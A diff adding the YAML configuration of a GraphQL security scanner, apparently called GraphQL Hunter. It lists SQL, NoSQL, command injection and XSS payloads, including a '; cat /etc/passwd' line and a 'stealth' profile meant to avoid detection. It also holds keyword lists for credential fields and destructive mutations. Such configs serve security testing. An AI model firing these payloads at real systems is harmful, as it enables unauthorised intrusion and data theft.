@@ -1,0 +1,138 @@
+# GraphQL Hunter Configuration
+# This file contains configurable payloads and settings
+
+# SQL Injection Payloads
+sql_injection:
+  basic:
+    - "' OR '1'='1"
+    - "' OR 1=1--"
+    - "admin'--"
+    - "' OR 'a'='a"
+  
+  union_based:
+    - "' UNION SELECT NULL--"
+    - "' UNION SELECT NULL, NULL--"
+    - "' UNION ALL SELECT NULL--"
+  
+  time_based:
+    - "' WAITFOR DELAY '0:0:5'--"
+    - "' AND SLEEP(5)--"
+    - "'; SELECT PG_SLEEP(5)--"
+  
+  error_based:
+    - "' AND 1=CONVERT(int, (SELECT @@version))--"
+    - "' AND extractvalue(1, concat(0x5c, (SELECT @@version)))--"
+
+# NoSQL Injection Payloads
+nosql_injection:
+  - '{"$gt": ""}'
+  - '{"$ne": null}'
+  - '{"$regex": ".*"}'
+  - '{"$where": "1==1"}'
+  - '{"$nin": []}'
+
+# Command Injection Payloads
+command_injection:
+  - "; ls -la"
+  - "| whoami"
+  - "`id`"
+  - "$(whoami)"
+  - "&& dir"
+  - "; cat /etc/passwd"
+  - "| type C:\\Windows\\win.ini"
+
+# XSS Payloads (for testing in GraphQL responses)
+xss_payloads:
+  - "<script>alert('XSS')</script>"
+  - "<img src=x onerror=alert('XSS')>"
+  - "javascript:alert('XSS')"
+  - "<svg onload=alert('XSS')>"
+
+# Scan Profiles Configuration
+profiles:
+  quick:
+    depth_limit: 3
+    field_limit: 10
+    enable_dos: false
+    enable_deep_injection: false
+    batch_size: 5
+    timeout: 10
+    description: "Fast scan with minimal tests"
+  
+  standard:
+    depth_limit: 5
+    field_limit: 20
+    enable_dos: true
+    enable_deep_injection: true
+    batch_size: 10
+    timeout: 30
+    description: "Balanced scan with good coverage"
+  
+  deep:
+    depth_limit: 10
+    field_limit: 50
+    enable_dos: true
+    enable_deep_injection: true
+    batch_size: 20
+    timeout: 60
+    description: "Thorough scan with extensive tests"
+  
+  stealth:
+    depth_limit: 3
+    field_limit: 10
+    enable_dos: false
+    enable_deep_injection: false
+    batch_size: 3
+    timeout: 30
+    delay: 1.0
+    description: "Slow, stealthy scan to avoid detection"
+
+# Rate Limiting Settings
+rate_limiting:
+  default_delay: 0
+  stealth_delay: 1.0
+  max_requests_per_minute: 60
+
+# Sensitive Keywords (for finding sensitive fields)
+sensitive_keywords:
+  - password
+  - passwd
+  - pwd
+  - secret
+  - token
+  - api_key
+  - apikey
+  - private
+  - credential
+  - auth
+  - ssn
+  - credit_card
+  - cvv
+  - pin
+  - admin
+  - internal
+  - debug
+
+# Dangerous Mutation Keywords
+dangerous_mutations:
+  - delete
+  - remove
+  - drop
+  - destroy
+  - admin
+  - privilege
+  - permission
+  - role
+  - grant
+  - revoke
+  - ban
+  - disable
+
+# Default Settings
+defaults:
+  timeout: 30
+  max_depth: 5
+  max_fields: 20
+  max_batch_size: 10
+  user_agent: "GraphQL-Hunter/1.0"
+
